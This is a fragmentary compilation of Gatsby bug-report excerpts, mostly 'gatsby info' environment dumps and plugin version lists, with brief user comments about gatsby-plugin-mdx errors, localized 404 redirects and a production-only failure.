```` system: os: windows 10 10.0.19041 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz binaries: node: 12.16.1 - c:\\program files\ odejs\ ode.exe yarn: 1.3.2 - ~\\appdata\ oaming\ pm\\yarn.cmd npm: 6.11.3 - c:\\program files\ odejs\ pm.cmd languages: python: 3.6.4 browsers: chrome: 85.0.4183.102 edge: spartan (44.19041.423.0), chromium (85.0.564.51) npmpackages: gatsby: ^2.13.50 => 2.24.63 gatsby-image: ^2.2.8 => 2.4.19 gatsby-plugin-manifest: ^2.2.4 => 2.4.30 gatsby-plugin-mdx: ^1.0.0 => 1.2.40 gatsby-plugin-offline: ^2.2.4 => 2.2.10 gatsby-plugin-react-helmet: ^3.1.3 => 3.3.11 gatsby-plugin-sharp: ^2.2.9 => 2.6.36 gatsby-source-filesystem: ^2.1.8 => 2.3.30 gatsby-transformer-sharp: ^2.2.5 => 2.5.15 npmglobalpackages: gatsby-cli: 2.12.99
```` ## notes `gatsby build` seems to work without issue.
adding `gatsby-plugin-layout` and configuring it to be the same template as the one used on posts seems to solve the problem, but it is fiddly (set the layout component to the component used in createpage).
i have tried resetting cache/npm modules/package-lock.json/fiddling with package versions, without any luck
all starter packages relying on `gatsby-plugin-mdx` seem to be broken
the only exception i could find is `gatsby-gitbook-starter` which works, but disabling the layout plugin yields the same error
thanks a lot for your time
system: os: macos 10.15.6 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.8.0 - ~/.nvm/versions/node/v14.8.0/bin/node yarn: 1.22.5 - /usr/local/bin/yarn npm: 6.14.8 - ~/.nvm/versions/node/v14.8.0/bin/npm languages: python: 3.8.5 - /usr/local/bin/python browsers: safari: 14.0 npmpackages: gatsby: ^2.24.63 => 2.24.63 gatsby-image: ^2.4.19 => 2.4.19 gatsby-plugin-emotion: ^4.3.11 => 4.3.11 gatsby-plugin-layout: ^1.3.11 => 1.3.11 gatsby-plugin-mdx: ^1.2.40 => 1.2.40 gatsby-plugin-react-helmet: ^3.3.11 => 3.3.11 gatsby-plugin-robots-txt: ^1.5.2 => 1.5.2 gatsby-plugin-sharp: ^2.6.36 => 2.6.36 gatsby-plugin-sitemap: ^2.4.13 => 2.4.13 gatsby-remark-images: ^3.3.30 => 3.3.30 gatsby-source-filesystem: ^2.3.30 => 2.3.30 gatsby-theme-material-ui: ^1.0.13 => 1.0.13 gatsby-theme-material-ui-top-layout: ^1.0.3 => 1.0.3 gatsby-transformer-json: ^2.4.12 => 2.4.12 gatsby-transformer-remark: ^2.8.35 => 2.8.35 gatsby-transformer-sharp: ^2.5.15 => 2.5.15
``` system: os: macos 10.15.6 cpu: (8) x64 intel(r) core(tm) i7-8557u cpu @ 1.70ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.3.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.8 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.102 firefox: 80.0.1 safari: 13.1.2 npmpackages: gatsby: ^2.24.63 => 2.24.63 ```
$ gatsby info --clipboard system: os: linux 5.4 manjaro linux cpu: (4) x64 intel(r) core(tm) i5-6500 cpu @ 3.20ghz shell: 5.8 - /bin/zsh binaries: node: 14.10.0 - /usr/bin/node yarn: 1.22.5 - /usr/bin/yarn npm: 6.14.7 - /usr/bin/npm languages: python: 3.8.5 - /usr/bin/python browsers: firefox: 80.0.1 npmpackages: gatsby: ^2.24.63 => 2.24.63
``` ### other *i think i just no understand something.*
**additional question :** how i can create an redirect the page like `/test` to `/en/test` (or `/en/404`) for localized error page ?
system: os: windows 10 10.0.18362 cpu: (8) x64 intel(r) core(tm) i5-8250u cpu @ 1.60ghz binaries: node: 12.18.0 - d:\ ode.js\ ode.exe yarn: 1.22.5 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.14.8 - d:\ ode.js\ pm.cmd languages: python: 3.8.0 browsers: chrome: 85.0.4183.102 edge: spartan (44.18362.449.0) npmpackages: gatsby: ^2.24.61 => 2.24.61 gatsby-cli: ^2.12.98 => 2.12.98 gatsby-image: ^2.4.19 => 2.4.19 gatsby-plugin-facebook-pixel: ^1.0.3 => 1.0.3 gatsby-plugin-feed-mdx: ^1.0.1 => 1.0.1 gatsby-plugin-google-analytics: ^2.3.4 => 2.3.14 gatsby-plugin-linkedin-insight: ^1.0.1 => 1.0.1 gatsby-plugin-lunr: ^1.5.2 => 1.5.2 gatsby-plugin-manifest: ^2.4.30 => 2.4.30 gatsby-plugin-mdx: ^1.0.57 => 1.2.40 gatsby-plugin-offline: ^3.0.40 => 3.2.28 gatsby-plugin-react-helmet: ^3.1.16 => 3.3.11 gatsby-plugin-sass: ^2.3.6 => 2.3.13 gatsby-plugin-sharp: ^2.5.7 => 2.6.36 gatsby-plugin-sitemap: ^2.4.1 => 2.4.13 gatsby-remark-images: ^3.1.38 => 3.3.30 gatsby-source-filesystem: ^2.1.40 => 2.3.30 gatsby-transformer-json: ^2.2.18 => 2.4.12 gatsby-transformer-sharp: ^2.4.7 => 2.5.15 npmglobalpackages: gatsby-cli: 2.12.99 and my package json: "dependencies": { "@mdx-js/mdx": "^1.6.16", "@mdx-js/react": "^1.5.1", "bulma": "^0.9.0", "formik": "^2.1.4", "gatsby": "^2.24.61", "gatsby-cli": "^2.12.98", "gatsby-image": "^2.4.19", "gatsby-plugin-facebook-pixel": "^1.0.3", "gatsby-plugin-feed-mdx": "^1.0.1", "gatsby-plugin-google-analytics": "^2.3.4", "gatsby-plugin-linkedin-insight": "^1.0.1", "gatsby-plugin-lunr": "^1.5.2", "gatsby-plugin-manifest": "^2.4.30", "gatsby-plugin-mdx": "^1.0.57", "gatsby-plugin-offline": "^3.0.40", "gatsby-plugin-react-helmet": "^3.1.16", "gatsby-plugin-sass": "^2.3.6", "gatsby-plugin-sharp": "^2.5.7", "gatsby-plugin-sitemap": "^2.4.1", "gatsby-remark-images": "^3.1.38", "gatsby-source-filesystem": "^2.1.40", "gatsby-transformer-json": "^2.2.18", "gatsby-transformer-sharp": "^2.4.7", "glob": "^7.1.6", "node-sass": "^4.14.1", "react": "^16.12.0", "react-dom": "^16.12.0", "react-google-recaptcha-v3": "^1.5.2", "react-helmet": "^5.2.1", "yup": "^0.29.1" }
system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.3 - /bin/zsh binaries: node: 14.8.0 - /var/folders/vy/_z2hm64112dffhkgllqkw4zm0000gn/t/yarn--1600712841008-0.12999828153402126/node yarn: 1.22.4 - /var/folders/vy/_z2hm64112dffhkgllqkw4zm0000gn/t/yarn--1600712841008-0.12999828153402126/yarn npm: 6.14.7 - ~/.nvm/versions/node/v14.8.0/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 85.0.4183.121 safari: 13.1.2
amazon cloudfront - serverless website
npm packages "gatsby": "2.24.62", "gatsby-image": "2.4.19", "gatsby-plugin-alias-imports": "1.0.5", "gatsby-plugin-facebook-pixel": "1.0.3", "gatsby-plugin-load-script": "1.1.0", "gatsby-plugin-manifest": "2.4.30", "gatsby-plugin-offline": "3.2.28", "gatsby-plugin-preconnect": "1.1.54", "gatsby-plugin-react-helmet": "3.3.11", "gatsby-plugin-react-svg": "3.0.0", "gatsby-plugin-robots-txt": "1.5.2", "gatsby-plugin-sass": "2.3.13", "gatsby-plugin-sharp": "2.6.36", "gatsby-plugin-sitemap": "2.4.13", "gatsby-plugin-webfonts": "1.1.3", "gatsby-source-filesystem": "2.3.30", "gatsby-transformer-inline-svg": "0.0.7", "gatsby-transformer-sharp": "2.5.15",
``` ### one further comment **why the issue only happens in production?** - this issue is causing economic losses for us because we do not have the full availability of our website for our users
we can't keep sending hot-fix to production and check with our users if the issue still persists
we are up-to-date with gatsby and other npm packages
we are working with queries [described in the documentation]( #composing-custom-usestaticquery-hooks)
what more do we need??
``` system: os: linux 4.4 ubuntu 18.04.5 lts (bionic beaver) cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 4.4.20 - /bin/bash binaries: node: 10.22.0 - ~/.nvm/versions/node/v10.22.0/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.6 - ~/.nvm/versions/node/v10.22.0/bin/npm languages: python: 2.7.17 - /usr/bin/python npmpackages: gatsby: ^2.24.61 => 2.24.61 gatsby-image: ^2.4.19 => 2.4.19 gatsby-plugin-alias-imports: ^1.0.5 => 1.0.5 gatsby-plugin-react-helmet: ^3.3.11 => 3.3.11 gatsby-plugin-sharp: ^2.6.36 => 2.6.36 gatsby-plugin-styled-components: ^3.3.11 => 3.3.11 gatsby-source-filesystem: ^2.3.23 => 2.3.23 npmglobalpackages: gatsby-cli: 2.12.79
``` system: os: linux 4.15 debian gnu/linux 10 (buster) 10 (buster) cpu: (8) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz shell: 5.0.3 - /bin/bash binaries: node: 12.13.0 - ~/.nvm/versions/node/v12.13.0/bin/node yarn: 1.19.1 - ~/.yarn/bin/yarn npm: 6.12.0 - ~/.nvm/versions/node/v12.13.0/bin/npm languages: python: 2.7.16 - /usr/bin/python npmpackages: gatsby: ^2.22.15 => 2.23.3 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-image: ^2.4.1 => 2.4.7 gatsby-plugin-alias-imports: ^1.0.5 => 1.0.5 gatsby-plugin-google-analytics: ^2.3.1 => 2.3.4 gatsby-plugin-google-tagmanager: ^2.3.7 => 2.3.7 gatsby-plugin-lodash: ^3.3.10 => 3.3.10 gatsby-plugin-manifest: ^2.4.19 => 2.4.19 gatsby-plugin-netlify-redirect: ^1.0.0 => 1.0.0 gatsby-plugin-offline: ^2.2.10 => 2.2.10 gatsby-plugin-react-helmet: ^3.3.4 => 3.3.4 gatsby-plugin-schema-snapshot: ^1.0.0 => 1.0.0 gatsby-plugin-sharp: ^2.6.1 => 2.6.11 gatsby-plugin-sitemap: ^2.4.11 => 2.4.11 gatsby-plugin-styled-components: ^3.3.10 => 3.3.10 gatsby-source-drupal: ^3.5.19 => 3.5.19 gatsby-transformer-sharp: ^2.5.1 => 2.5.5
sorry i cannot, i get the error stacktrace.
system: os: windows 10 10.0.19042 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz binaries: node: 12.18.3 - d:\\programs\ odejs\ ode.exe yarn: 1.22.5 - ~\\appdata\ oaming\ pm\\yarn.cmd npm: 6.14.6 - d:\\programs\ odejs\ pm.cmd browsers: chrome: 84.0.4147.89 edge: spartan (44.19041.423.0), chromium (85.0.564.51) npmpackages: gatsby: ^2.24.47 => 2.24.60 gatsby-image: ^2.4.16 => 2.4.18 gatsby-plugin-advanced-sitemap: ^1.5.5 => 1.5.6 gatsby-plugin-manifest: ^2.4.23 => 2.4.29 gatsby-plugin-offline: ^3.2.23 => 3.2.28 gatsby-plugin-postcss: ^2.3.11 => 2.3.12 gatsby-plugin-purgecss: ^5.0.0 => 5.0.0 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.11 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 //fixes the problem but it's currently disabled gatsby-plugin-sharp: ^2.6.27 => 2.6.36 gatsby-plugin-transition-link: ^1.20.2 => 1.20.2 gatsby-plugin-typography: ^2.5.10 => 2.5.1 gatsby-source-filesystem: ^2.3.24 => 2.3.30 gatsby-source-prismic: ^3.2.1 => 3.2.1 gatsby-transformer-sharp: ^2.5.13 => 2.5.15 npmglobalpackages: gatsby-cli: 2.12.97
``` system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.2 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.132 firefox: 79.0 safari: 13.1.2 npmpackages: gatsby: ^2.24.60 => 2.24.60 gatsby-plugin-manifest: ^2.0.19 => 2.3.3 gatsby-plugin-meta-redirect: ^1.1.1 => 1.1.1 gatsby-plugin-react-helmet: ^3.0.7 => 3.2.1 gatsby-plugin-react-svg: ^2.1.1 => 2.1.2 gatsby-plugin-sass: ^2.0.10 => 2.2.1 gatsby-source-contentful: ^2.3.46 => 2.3.46
system: os: linux 5.8 arch linux cpu: (12) x64 intel(r) core(tm) i7-8700k cpu @ 3.70ghz shell: 5.0.18 - /bin/bash binaries: node: 14.10.1 - /usr/bin/node yarn: 1.22.5 - /usr/bin/yarn npm: 6.14.8 - /usr/bin/npm languages: python: 3.8.5 - /usr/bin/python browsers: firefox: 80.0.1 npmpackages: gatsby: ^2.18.11 => 2.24.58 gatsby-image: ^2.2.34 => 2.4.17 gatsby-plugin-google-analytics: ^2.3.13 => 2.3.13 gatsby-plugin-manifest: ^2.2.30 => 2.4.28 gatsby-plugin-react-helmet: ^3.1.16 => 3.3.10 gatsby-plugin-sharp: ^2.6.28 => 2.6.35 gatsby-plugin-styled-components: ^3.3.10 => 3.3.10 gatsby-remark-autolink-headers: ^2.3.11 => 2.3.12 gatsby-remark-images: ^3.3.26 => 3.3.29 gatsby-source-filesystem: ^2.3.25 => 2.3.29 gatsby-transformer-remark: ^2.8.29 => 2.8.34 gatsby-transformer-sharp: ^2.3.6 => 2.5.14 npmglobalpackages: gatsby-cli: 2.12.96
``` system: os: linux 5.4 debian gnu/linux 10 (buster) 10 (buster) cpu: (16) x64 intel(r) core(tm) i9-9900k cpu @ 3.60ghz shell: 5.0.3 - /bin/bash binaries: node: 10.21.0 - /tmp/yarn--1600121216071-0.06585737032944339/node yarn: 1.22.4 - /tmp/yarn--1600121216071-0.06585737032944339/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python npmpackages: gatsby: ^2.24.54 => 2.24.54 gatsby-image: ^2.4.17 => 2.4.17 gatsby-plugin-manifest: ^2.4.28 => 2.4.28 gatsby-plugin-netlify: 2.3.14 => 2.3.14 gatsby-plugin-offline: ^3.2.27 => 3.2.27 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.32 => 2.6.32 gatsby-source-filesystem: ^2.3.28 => 2.3.28 gatsby-transformer-sharp: ^2.5.14 => 2.5.14
system: os: macos 10.15.6 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 3.2.57 - /bin/bash binaries: node: 12.13.0 - /usr/local/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 85.0.4183.102 edge: 83.0.478.54 firefox: 78.0.2 safari: 13.1.2 npmpackages: gatsby: ^2.24.47 => 2.24.58 gatsby-image: ^2.4.16 => 2.4.17 gatsby-plugin-alias-imports: ^1.0 => 1.0.5 gatsby-plugin-canonical-urls: ^2.3.10 => 2.3.10 gatsby-plugin-google-tagmanager: ^2.3.11 => 2.3.11 gatsby-plugin-layout: ^1.3.10 => 1.3.10 gatsby-plugin-mailchimp: ^5.2.2 => 5.2.2 gatsby-plugin-manifest: ^2.4.23 => 2.4.28 gatsby-plugin-netlify: ^2.3.13 => 2.3.14 gatsby-plugin-offline: ^3.2.23 => 3.2.27 gatsby-plugin-postcss: ^2.3.11 => 2.3.11 gatsby-plugin-postcss-sass: ^1.0 => 1.0.22 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-react-helmet-canonical-urls: ^1.4.0 => 1.4.0 gatsby-plugin-robots-txt: ^1.5.1 => 1.5.1 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-sharp: ^2.6.27 => 2.6.35 gatsby-plugin-sitemap: ^2.4.11 => 2.4.12 gatsby-plugin-styled-components: ^3.3.10 => 3.3.10 gatsby-plugin-transition-link: ^1.17.7 => 1.20.2 gatsby-remark-prettier: ^1.0 => 1.0.0 gatsby-remark-prismjs: ^3.5.10 => 3.5.12 gatsby-source-filesystem: ^2.3.24 => 2.3.29 gatsby-source-graphql: ^2.7.1 => 2.7.3 gatsby-transformer-remark: ^2.8.28 => 2.8.34 gatsby-transformer-sharp: ^2.5.13 => 2.5.14 npmglobalpackages: gatsby-cli: 2.12.96 gatsby: 2.17.1
``` system: os: macos 10.15.6 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.18.2 - /usr/local/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.14.5 - /usr/local/bin/npm browsers: chrome: 85.0.4183.102 firefox: 71.0 safari: 13.1.2 npmpackages: gatsby: ^2.24.57 => 2.24.57 gatsby-plugin-advanced-sitemap: ^1.5.5 => 1.5.5 gatsby-plugin-catch-links: ^2.1.2 => 2.2.1 gatsby-plugin-facebook-pixel: ^1.0.3 => 1.0.3 gatsby-plugin-feed: ^2.5.11 => 2.5.11 gatsby-plugin-google-analytics: ^2.1.20 => 2.2.2 gatsby-plugin-instagram-embed: ^2.0.1 => 2.0.1 gatsby-plugin-manifest: ^2.2.23 => 2.3.3 gatsby-plugin-mdx: ^1.0.22 => 1.2.39 gatsby-plugin-meta-redirect: ^1.1.1 => 1.1.1 gatsby-plugin-netlify: ^2.3.13 => 2.3.13 gatsby-plugin-offline: ^3.0.16 => 3.1.2 gatsby-plugin-react-helmet: ^3.1.3 => 3.2.2 gatsby-plugin-remove-fingerprints: ^0.0.2 => 0.0.2 gatsby-plugin-sharp: ^2.2.31 => 2.6.19 gatsby-plugin-simple-analytics: ^1.0.1 => 1.0.3 gatsby-plugin-slug: ^1.1.0 => 1.1.0 gatsby-plugin-theme-ui: ^0.2.26 => 0.2.53 gatsby-plugin-twitter: ^2.2.2 => 2.2.2 gatsby-redirect-from: ^0.2.4 => 0.2.4 gatsby-remark-copy-linked-files: ^2.1.28 => 2.2.1 gatsby-remark-embedder: ^3.0.0 => 0.0.0-semantically-released gatsby-remark-giphy: ^1.1.2 => 1.1.2 gatsby-remark-images: ^3.1.28 => 3.3.29 gatsby-remark-relative-images: ^0.2.3 => 0.2.3 gatsby-source-filesystem: ^2.1.33 => 2.2.2 gatsby-transformer-remark: ^2.6.37 => 2.7.1 gatsby-transformer-sharp: ^2.2.23 => 2.4.4 npmglobalpackages: gatsby-cli: 2.7.54 ```
system: os: linux 5.4 ubuntu 20.04.1 lts (focal fossa) cpu: (4) x64 intel(r) pentium(r) cpu 4405u @ 2.10ghz shell: 5.0.17 - /bin/bash binaries: node: 10.19.0 - /usr/bin/node npm: 6.14.8 - /usr/local/bin/npm languages: python: 2.7.18 - /usr/bin/python browsers: firefox: 80.0.1 npmpackages: gatsby: ^2.24.57 => 2.24.57 npmglobalpackages: gatsby-cli: 2.12.95
(if relevant) system: os: macos 10.15.6 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.18.3 - ~/.nvm/versions/node/v12.18.3/bin/node yarn: 1.22.5 - ~/.yvm/shim/yarn npm: 6.14.6 - ~/.nvm/versions/node/v12.18.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.102 edge: 85.0.564.51 firefox: 76.0 safari: 13.1.2 npmpackages: gatsby: 2.24.27 => 2.24.27 gatsby-plugin-typescript: 2.3.3 => 2.3.3 ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: we've got another graphql query which gets all the pages in the createpages and creates the pages dynamically
`gatsby-browser.js`: apolloprovider for other data queries from 3rd party - even removing this it still errors
`gatsby-ssr.js`: apolloprovider for other data queries from 3rd party - even removing this it still errors
``` system: os: macos 10.15.6 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.18.1 - ~/.nvm/versions/node/v12.18.1/bin/node yarn: 1.22.5 - ~/.yarn/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v12.18.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.102 firefox: 77.0.1 safari: 13.1.2 npmpackages: gatsby: 2.24.57 => 2.24.57 gatsby-background-image: ^1.1.2 => 1.1.2 gatsby-image: ^2.4.17 => 2.4.17 gatsby-plugin-eslint: 2.0.8 => 2.0.8 gatsby-plugin-heap: ^1.1.0 => 1.1.0 gatsby-plugin-manifest: 2.4.28 => 2.4.28 gatsby-plugin-offline: 3.2.27 => 3.2.27 gatsby-plugin-postcss: ^2.3.11 => 2.3.11 gatsby-plugin-react-helmet: 3.3.10 => 3.3.10 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-sharp: ^2.6.35 => 2.6.35 gatsby-plugin-typegen: ^2.2.1 => 2.2.1 gatsby-source-filesystem: ^2.3.29 => 2.3.29 gatsby-transformer-sharp: ^2.5.14 => 2.5.14 npmglobalpackages: gatsby-cli: 2.12.87
```zsh system: os: macos 10.15.6 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.16.0 - ~/.nvm/versions/node/v10.16.0/bin/node yarn: 1.22.5 - ~/.yarn/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.83 firefox: 79.0 safari: 13.1.2 npmpackages: gatsby: ^2.24.7 => 2.24.53 gatsby-image: ^2.4.13 => 2.4.16 gatsby-plugin-chakra-ui: ^0.1.4 => 0.1.4 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-sharp: ^2.6.19 => 2.6.31 gatsby-source-filesystem: ^2.3.7 => 2.3.27 gatsby-source-wordpress-experimental: ^1.3.8 => 1.3.8 gatsby-transformer-sharp: ^2.5.14 => 2.5.14 gatsby-wordpress-experimental-inline-images: ^0.0.3 => 0.0.3 npmglobalpackages: gatsby-cli: 2.12.93
system: os: linux 5.4 ubuntu 20.04.1 lts (focal fossa) cpu: (8) x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 5.0.17 - /bin/bash binaries: node: 10.19.0 - /usr/bin/node npm: 6.14.4 - /usr/bin/npm languages: python: 2.7.18 - /usr/bin/python browsers: chrome: 85.0.4183.83 firefox: 80.0 npmpackages: gatsby: ^2.24.47 => 2.24.47 gatsby-image: ^2.4.17 => 2.4.17 gatsby-plugin-netlify-cms: ^4.3.13 => 4.3.13 gatsby-plugin-sharp: ^2.6.34 => 2.6.34 gatsby-plugin-styled-components: ^3.3.10 => 3.3.10 gatsby-remark-images: ^3.3.29 => 3.3.29 gatsby-remark-relative-images: ^2.0.2 => 2.0.2 gatsby-source-filesystem: ^2.3.27 => 2.3.27 gatsby-transformer-remark: ^2.8.32 => 2.8.32 gatsby-transformer-sharp: ^2.5.14 => 2.5.14 ### repository
<details> <summary>gatsby environment</summary> ``` npmpackages: gatsby: ^2.24.56 => 2.24.56 gatsby-image: ^2.4.17 => 2.4.17 gatsby-plugin-manifest: ^2.4.28 => 2.4.28 gatsby-plugin-material-ui: ^2.1.10 => 2.1.10 gatsby-plugin-offline: ^3.2.27 => 3.2.27 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.34 => 2.6.34 gatsby-plugin-typescript: ^2.4.19 => 2.4.19 gatsby-source-filesystem: ^2.3.29 => 2.3.29 gatsby-transformer-json: ^2.4.11 => 2.4.11 gatsby-transformer-sharp: ^2.5.14 => 2.5.14 npmglobalpackages: gatsby-cli: 1.1.46 gatsby-dev-cli: 1.2.12 gatsby: 2.0.18
system: os: macos 10.15.6 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.17.0 - /usr/local/bin/node yarn: 1.19.1 - /usr/local/bin/yarn npm: 6.14.8 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.83 firefox: 80.0.1 safari: 13.1.2 npmpackages: gatsby: ^2.24.56 => 2.24.56 gatsby-image: ^2.4.17 => 2.4.17 gatsby-plugin-compile-es6-packages: ^2.1.0 => 2.1.0 gatsby-plugin-intl: 0.2.8 => 0.2.8 gatsby-plugin-less: ^3.2.9 => 3.2.9 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-react-svg: ^2.1.2 => 2.1.2 gatsby-plugin-routes: ^1.0.0 => 1.0.0 gatsby-plugin-tslint: 0.0.2 => 0.0.2 gatsby-plugin-typescript: ^2.4.19 => 2.4.19 gatsby-source-sanity: ^5.0.6 => 5.0.6 npmglobalpackages: gatsby-cli: 2.12.93 gatsby: 2.15.18
system: os: linux 5.4 ubuntu 20.04.1 lts (focal fossa) cpu: (2) x64 intel(r) xeon(r) cpu d-1527 @ 2.20ghz shell: 5.0.17 - /bin/bash binaries: node: 12.18.3 - /usr/bin/node npm: 6.14.8 - /usr/bin/npm npmpackages: gatsby: ^2.24.43 => 2.24.43 gatsby-image: 2.2.37 => 2.2.37 gatsby-link: 2.2.27 => 2.2.27 gatsby-plugin-feed: 2.3.25 => 2.3.25 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-netlify: 2.1.30 => 2.1.30 gatsby-plugin-nprogress: 2.1.17 => 2.1.17 gatsby-plugin-offline: 3.0.30 => 3.0.30 gatsby-plugin-preact: 3.1.24 => 3.1.24 gatsby-plugin-react-helmet: 3.1.18 => 3.1.18 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-sharp: 2.3.10 => 2.3.10 gatsby-plugin-sitemap: 2.2.24 => 2.2.24 gatsby-remark-copy-linked-files: 2.1.33 => 2.1.33 gatsby-remark-images: 3.1.39 => 3.1.39 gatsby-remark-prismjs: 3.3.28 => 3.3.28 gatsby-remark-responsive-iframe: 2.2.30 => 2.2.30 gatsby-remark-smartypants: 2.1.19 => 2.1.19 gatsby-source-filesystem: 2.1.43 => 2.1.43 gatsby-transformer-remark: 2.6.45 => 2.6.45 gatsby-transformer-sharp: 2.3.9 => 2.3.9 npmglobalpackages: gatsby-cli: 2.12.94 gatsby: 2.24.55
system: os: macos high sierra 10.13.6 cpu: (4) x64 intel(r) core(tm) i5-2467m cpu @ 1.60ghz shell: 3.2.57 - /bin/bash binaries: node: 14.9.0 - /usr/local/bin/node yarn: 1.22.5 - /usr/local/bin/yarn npm: 6.14.8 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.102 firefox: 78.0.2 safari: 13.1.2
system: os: macos 10.15.6 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.11.0 - ~/.nvm/versions/node/v13.11.0/bin/node yarn: 1.22.5 - /usr/local/bin/yarn npm: 6.14.8 - ~/.nvm/versions/node/v13.11.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.83 safari: 13.1.2 npmpackages: gatsby: ^2.24.56 => 2.24.56 gatsby-image: ^2.4.17 => 2.4.17 gatsby-plugin-canonical-urls: ^2.3.9 => 2.3.10 gatsby-plugin-catch-links: ^2.3.11 => 2.3.11 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-google-analytics: ^2.3.13 => 2.3.13 gatsby-plugin-google-tagmanager: ^2.3.10 => 2.3.11 gatsby-plugin-manifest: ^2.4.28 => 2.4.28 gatsby-plugin-netlify: ^2.3.14 => 2.3.14 gatsby-plugin-nprogress: ^2.3.9 => 2.3.10 gatsby-plugin-offline: ^3.2.27 => 3.2.27 gatsby-plugin-react-helmet: ^3.3.9 => 3.3.10 gatsby-plugin-robots-txt: ^1.5.1 => 1.5.1 gatsby-plugin-sass: ^2.3.10 => 2.3.12 gatsby-plugin-sharp: ^2.6.34 => 2.6.34 gatsby-plugin-sitemap: ^2.4.12 => 2.4.12 gatsby-plugin-smoothscroll: ^1.2.0 => 1.2.0 gatsby-remark-embedder: ^3.0.0 => 3.0.0 gatsby-remark-images: ^3.3.29 => 3.3.29 gatsby-remark-images-contentful: ^2.3.16 => 2.3.16 gatsby-remark-relative-images: ^2.0.2 => 2.0.2 gatsby-source-contentful: ^2.3.44 => 2.3.44 gatsby-source-filesystem: ^2.3.29 => 2.3.29 gatsby-transformer-remark: ^2.8.34 => 2.8.34 gatsby-transformer-sharp: ^2.5.14 => 2.5.14 npmglobalpackages: gatsby-cli: 2.12.93
`chrome version 85.0.4183.83 (official build) (64-bit)`
